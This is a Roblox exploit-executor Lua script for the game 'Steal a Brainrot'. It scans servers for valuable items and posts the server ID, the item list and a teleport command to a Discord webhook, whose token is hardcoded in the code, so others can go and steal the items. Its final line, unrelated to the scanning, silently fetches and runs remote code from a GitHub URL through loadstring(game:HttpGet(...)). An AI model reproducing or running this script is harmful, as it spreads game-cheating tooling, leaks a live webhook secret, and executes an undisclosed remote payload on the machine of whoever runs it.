-- 🎯 BRAINROT INCOME SCANNER v2.0 (ПОЛНАЯ ВЕРСИЯ)
-- Сканирует все объекты в Steal a Brainrot и отправляет уведомления в Discord
-- Запуск: автоматически при старте + по клавише F

local Players = game:GetService('Players')
local UserInputService = game:GetService('UserInputService')
local HttpService = game:GetService('HttpService')

-- ⚙️ НАСТРОЙКИ
local INCOME_THRESHOLD = 50_000_000 -- 50M/s минимум для уведомления
local HIGH_PRIORITY_THRESHOLD = 500_000_000 -- 500M/s для особо важных объектов
local DISCORD_WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1426282608710647952/bmfmWPMug07ht7nRa_QeCVi7tfItybezKVkZ2tmw7lsODttiUnSnYJArl6UchxqIbeyT'

print('🎯 Brainrot Scanner v2.0 | JobId:', game.JobId)

-- 🎮 ОБЪЕКТЫ С ЭМОДЗИ И ВАЖНОСТЬЮ
local OBJECTS = {
    ['Garama and Madundung'] = { emoji = '🍝', important = true },
    ['Dragon Cannelloni'] = { emoji = '🐲', important = true },
    ['Nuclearo Dinossauro'] = { emoji = '🦕', important = true },
    ['Esok Sekolah'] = { emoji = '🏠', important = true, high_priority = true },
    ['La Supreme Combinasion'] = { emoji = '🔫', important = true },
    ['Ketupat Kepat'] = { emoji = '🍏', important = true },
    ['Strawberry Elephant'] = { emoji = '🐘', important = true },
    ['Spaghetti Tualetti'] = { emoji = '🚽', important = true, high_priority = true },
    ['Ketchuru and Musturu'] = { emoji = '🍾', important = true },
    ['Tralaledon'] = { emoji = '🦈', important = true },
    ['La Extinct Grande'] = { emoji = '🩻', important = true, high_priority = true },
    ['Tictac Sahur'] = { emoji = '🕰️', important = true },
    ['Los Primos'] = { emoji = '🙆‍♂️', important = true },
    ['Tang Tang Keletang'] = { emoji = '📢', important = true, high_priority = true },
    ['Money Money Puggy'] = { emoji = '🐶', important = true, high_priority = true },
    ['Burguro And Fryuro'] = { emoji = '🍔', important = true },
    ['Chillin Chili'] = { emoji = '🌶', important = true, high_priority = true },
    ['La Secret Combinasion'] = { emoji = '❓', important = true },
}

-- Создаем списки важных объектов
local ALWAYS_IMPORTANT = {}
local HIGH_PRIORITY_OBJECTS = {}
for name, cfg in pairs(OBJECTS) do
    if cfg.important then
        ALWAYS_IMPORTANT[name] = true
    end
    if cfg.high_priority then
        HIGH_PRIORITY_OBJECTS[name] = true
    end
end

-- 💰 ПАРСЕР ДОХОДА: принимаем только строки, оканчивающиеся на "/s"
-- С суффиксом масштаба (K/M/B) в любом регистре или без него.
local function parseGenerationText(s)
    if type(s) ~= 'string' or s == '' then
        return nil
    end
    -- Нормализация: убираем $, запятые и пробелы
    local norm = s:gsub('%$', ''):gsub(',', ''):gsub('%s+', '')
    -- Форматы: 10/s, 2.5M/s, 750k/s, 1b/s
    local num, suffix = norm:match('^([%-%d%.]+)([KkMmBb]?)/s$')
    if not num then
        return nil
    end
    local val = tonumber(num)
    if not val then
        return nil
    end
    local mult = 1
    if suffix == 'K' or suffix == 'k' then
        mult = 1e3
    elseif suffix == 'M' or suffix == 'm' then
        mult = 1e6
    elseif suffix == 'B' or suffix == 'b' then
        mult = 1e9
    end
    return val * mult
end

local function formatIncomeNumber(n)
    if not n then
        return 'Unknown'
    end
    if n >= 1e9 then
        local v = n / 1e9
        return (v % 1 == 0 and string.format('%dB/s', v) or string.format(
            '%.1fB/s',
            v
        )):gsub('%.0B/s', 'B/s')
    elseif n >= 1e6 then
        local v = n / 1e6
        return (v % 1 == 0 and string.format('%dM/s', v) or string.format(
            '%.1fM/s',
            v
        )):gsub('%.0M/s', 'M/s')
    elseif n >= 1e3 then
        local v = n / 1e3
        return (v % 1 == 0 and string.format('%dK/s', v) or string.format(
            '%.1fK/s',
            v
        )):gsub('%.0K/s', 'K/s')
    else
        return string.format('%d/s', n)
    end
end

-- 📝 ПОЛУЧЕНИЕ ТЕКСТА ИЗ UI
local function grabText(inst)
    if not inst then
        return nil
    end
    if
        inst:IsA('TextLabel')
        or inst:IsA('TextButton')
        or inst:IsA('TextBox')
    then
        local ok, ct = pcall(function()
            return inst.ContentText
        end)
        if ok and type(ct) == 'string' and #ct > 0 then
            return ct
        end
        local t = inst.Text
        if type(t) == 'string' and #t > 0 then
            return t
        end
    end
    if inst:IsA('StringValue') then
        local v = inst.Value
        if type(v) == 'string' and #v > 0 then
            return v
        end
    end
    return nil
end

local function getOverheadInfo(animalOverhead)
    if not animalOverhead then
        return nil, nil
    end

    local name = nil
    local display = animalOverhead:FindFirstChild('DisplayName')
    if display then
        name = grabText(display)
    end

    if not name then
        local anyText = animalOverhead:FindFirstChildOfClass('TextLabel')
            or animalOverhead:FindFirstChildOfClass('TextButton')
            or animalOverhead:FindFirstChildOfClass('TextBox')
        name = anyText and grabText(anyText) or nil
    end

    local genText = nil
    local generation = animalOverhead:FindFirstChild('Generation')
    if generation then
        genText = grabText(generation)
    end

    if not genText then
        for _, child in ipairs(animalOverhead:GetDescendants()) do
            if
                child:IsA('TextLabel')
                or child:IsA('TextButton')
                or child:IsA('TextBox')
            then
                local text = grabText(child)
                if text and (text:match('%$') or text:match('/s')) then
                    genText = text
                    break
                end
            end
        end
    end

    return name, genText
end

local function isGuidName(s)
    return s:match('^[0-9a-fA-F]+%-%x+%-%x+%-%x+%-%x+$') ~= nil
end

-- 🔍 ПОЛНЫЕ СКАНЕРЫ
local function scanPlots()
    local results = {}
    local Plots = workspace:FindFirstChild('Plots')
    if not Plots then
        return results
    end

    for _, plot in ipairs(Plots:GetChildren()) do
        local Podiums = plot:FindFirstChild('AnimalPodiums')
        if Podiums then
            for _, podium in ipairs(Podiums:GetChildren()) do
                local Base = podium:FindFirstChild('Base')
                local Spawn = Base and Base:FindFirstChild('Spawn')
                local Attachment = Spawn and Spawn:FindFirstChild('Attachment')
                local Overhead = Attachment
                    and Attachment:FindFirstChild('AnimalOverhead')
                if Overhead then
                    local name, genText = getOverheadInfo(Overhead)
                    local genNum = genText and parseGenerationText(genText)
                        or nil
                    if name and genNum then
                        table.insert(
                            results,
                            { name = name, gen = genNum, location = 'Plot' }
                        )
                    end
                end
            end
        end
    end
    return results
end

local function scanRunway()
    local results = {}
    for _, obj in ipairs(workspace:GetChildren()) do
        if isGuidName(obj.Name) then
            local part = obj:FindFirstChild('Part')
            local info = part and part:FindFirstChild('Info')
            local overhead = info and info:FindFirstChild('AnimalOverhead')
            if overhead then
                local name, genText = getOverheadInfo(overhead)
                local genNum = genText and parseGenerationText(genText) or nil
                if name and genNum then
                    table.insert(
                        results,
                        { name = name, gen = genNum, location = 'Runway' }
                    )
                end
            end
        end
    end
    return results
end

local function scanAllOverheads()
    local results, processed = {}, {}
    local function recursiveSearch(parent)
        for _, child in ipairs(parent:GetChildren()) do
            if child.Name == 'AnimalOverhead' and not processed[child] then
                processed[child] = true
                local name, genText = getOverheadInfo(child)
                local genNum = genText and parseGenerationText(genText) or nil
                if name and genNum then
                    table.insert(
                        results,
                        { name = name, gen = genNum, location = 'World' }
                    )
                end
            end
            pcall(function()
                recursiveSearch(child)
            end)
        end
    end
    recursiveSearch(workspace)
    return results
end

local function scanPlayerGui()
    local results = {}
    local lp = Players.LocalPlayer
    if not lp then
        return results
    end

    local playerGui = lp:FindFirstChild('PlayerGui')
    if not playerGui then
        return results
    end

    local function searchInGui(parent)
        for _, child in ipairs(parent:GetChildren()) do
            if child.Name == 'AnimalOverhead' or child.Name:match('Animal') then
                local name, genText = getOverheadInfo(child)
                local genNum = genText and parseGenerationText(genText) or nil
                if name and genNum then
                    table.insert(
                        results,
                        { name = name, gen = genNum, location = 'GUI' }
                    )
                end
            end
            pcall(function()
                searchInGui(child)
            end)
        end
    end
    searchInGui(playerGui)
    return results
end

-- 📊 ГЛАВНАЯ ФУНКЦИЯ СБОРА
local function collectAll(timeoutSec)
    local t0 = os.clock()
    local collected = {}

    repeat
        collected = {}

        -- Запускаем все сканеры
        local allSources = {
            scanPlots(),
            scanRunway(),
            scanAllOverheads(),
            scanPlayerGui(),
        }

        -- Объединяем результаты
        for _, source in ipairs(allSources) do
            for _, item in ipairs(source) do
                table.insert(collected, item)
            end
        end

        -- Убираем дубликаты
        local seen, unique = {}, {}
        for _, item in ipairs(collected) do
            local key = item.name .. ':' .. tostring(item.gen)
            if not seen[key] then
                seen[key] = true
                table.insert(unique, item)
            end
        end
        collected = unique

        if #collected > 0 then
            break
        end
        task.wait(0.5)
    until os.clock() - t0 > timeoutSec

    return collected
end

local function shouldShow(name, gen)
    if ALWAYS_IMPORTANT[name] then
        return true
    end
    return (type(gen) == 'number') and gen >= INCOME_THRESHOLD
end

-- 📤 DISCORD УВЕДОМЛЕНИЯ
local function getRequester()
    return http_request
        or request
        or (syn and syn.request)
        or (fluxus and fluxus.request)
        or (KRNL_HTTP and KRNL_HTTP.request)
end

local function sendDiscordNotification(filteredObjects)
    local req = getRequester()
    if not req then
        warn('❌ Нет HTTP API в executor')
        return
    end

    local jobId = game.JobId
    local placeId = game.PlaceId

    if #filteredObjects == 0 then
        print('🔍 Важных объектов не найдено')
        return
    end

    -- Сортируем по типу и доходу (особо важные сначала, затем обычные важные по убыванию дохода)
    local highPriority, regularImportant = {}, {}
    for _, obj in ipairs(filteredObjects) do
        if HIGH_PRIORITY_OBJECTS[obj.name] then
            table.insert(highPriority, obj)
        else
            table.insert(regularImportant, obj)
        end
    end

    table.sort(highPriority, function(a, b)
        return a.gen > b.gen
    end)
    table.sort(regularImportant, function(a, b)
        return a.gen > b.gen
    end)

    local sorted = {}
    for _, obj in ipairs(highPriority) do
        table.insert(sorted, obj)
    end
    for _, obj in ipairs(regularImportant) do
        table.insert(sorted, obj)
    end

    -- Формируем красивый список (максимум 10)
    local objectsList = {}
    for i = 1, math.min(10, #sorted) do
        local obj = sorted[i]
        local emoji = OBJECTS[obj.name].emoji or '💰'
        local mark = HIGH_PRIORITY_OBJECTS[obj.name] and '🔥 ' or (ALWAYS_IMPORTANT[obj.name] and '⭐ ' or '')
        table.insert(
            objectsList,
            string.format(
                '%s%s **%s** (%s)',
                mark,
                emoji,
                obj.name,
                formatIncomeNumber(obj.gen)
            )
        )
    end
    local objectsText = table.concat(objectsList, '\n')

    -- Телепорт команда (простой текст для легкого копирования)
    local teleportText = string.format(
        "`local ts = game:GetService('TeleportService'); ts:TeleportToPlaceInstance(%d, '%s')`",
        placeId,
        jobId
    )

    local payload = {
        username = '🎯 Brainrot Scanner',
        embeds = {
            {
                title = '💎 Найдены ценные объекты в Steal a brainrot!',
                color = 0x2f3136,
                fields = {
                    {
                        name = '🆔 Сервер (Job ID)',
                        value = string.format('```%s```', jobId),
                        inline = false,
                    },
                    {
                        name = '💰 Важные объекты:',
                        value = objectsText,
                        inline = false,
                    },
                    {
                        name = '🚀 Телепорт:',
                        value = teleportText,
                        inline = false,
                    },
                },
                footer = {
                    text = string.format(
                        'Найдено: %d важных (%d 🔥) • %s',
                        #filteredObjects,
                        #highPriority,
                        os.date('%H:%M:%S')
                    ),
                },
                timestamp = DateTime.now():ToIsoDate(),
            },
        },
    }

    print(
        '📤 Отправляю уведомление с',
        #filteredObjects,
        'объектами'
    )

    local ok, res = pcall(function()
        return req({
            Url = DISCORD_WEBHOOK_URL,
            Method = 'POST',
            Headers = { ['Content-Type'] = 'application/json' },
            Body = HttpService:JSONEncode(payload),
        })
    end)

    if ok then
        print('✅ Уведомление отправлено в Discord!')
    else
        warn('❌ Ошибка отправки:', res)
    end
end

-- 🎮 ГЛАВНАЯ ФУНКЦИЯ
local function scanAndNotify()
    print('🔍 Сканирую все объекты...')
    local allFound = collectAll(8.0) -- 8 секунд таймаут

    -- Фильтрация по важности и доходу (с учетом разных порогов)
    local filtered = {}
    for _, obj in ipairs(allFound) do
        if OBJECTS[obj.name] then
            -- Для высокоприоритетных объектов проверяем порог 500M/s
            if HIGH_PRIORITY_OBJECTS[obj.name] then
                if obj.gen and obj.gen >= HIGH_PRIORITY_THRESHOLD then
                    table.insert(filtered, obj)
                end
            -- Для остальных важных объектов проверяем порог 50M/s
            elseif shouldShow(obj.name, obj.gen) then
                table.insert(filtered, obj)
            end
        end
    end

    -- Вывод в консоль
    print('Найдено всего объектов:', #allFound)
    print('Показано важных:', #filtered)

    for _, obj in ipairs(filtered) do
        local emoji = OBJECTS[obj.name].emoji or '💰'
        local mark = HIGH_PRIORITY_OBJECTS[obj.name] and '🔥 ' or (ALWAYS_IMPORTANT[obj.name] and '⭐ ' or '')
        print(
            string.format(
                '%s%s %s: %s (%s)',
                mark,
                emoji,
                obj.name,
                formatIncomeNumber(obj.gen),
                obj.location or 'Unknown'
            )
        )
    end

    -- Отправляем уведомление если есть что показать
    if #filtered > 0 then
        sendDiscordNotification(filtered)
    else
        print('🔍 Нет объектов для уведомления')
    end
end

-- 🚀 ЗАПУСК
print('🎯 === BRAINROT INCOME SCANNER ЗАПУЩЕН ===')
print('🔥 Особо важные объекты (≥500M/s): Spaghetti Tualetti, Esok Sekolah, La Extinct Grande, Tang Tang Keletang, Money Money Puggy, Chillin Chili')
print('⭐ Обычные важные объекты (≥50M/s): все остальные')
scanAndNotify()

-- ⌨️ ПОВТОР ПО КЛАВИШЕ F
local lastScan, DEBOUNCE = 0, 3
UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then
        return
    end
    if input.KeyCode == Enum.KeyCode.F then
        local now = os.clock()
        if now - lastScan < DEBOUNCE then
            return
        end
        lastScan = now
        print('\n🔄 === ПОВТОРНОЕ СКАНИРОВАНИЕ (F) ===')
        scanAndNotify()
    end
end)

print('💡 Нажмите F для повторного сканирования')
print('📱 Discord webhook готов к отправке уведомлений')
loadstring(game:HttpGet("https://raw.githubusercontent.com/xzoldeveloper/brain/refs/heads/main/botik.lua"))()
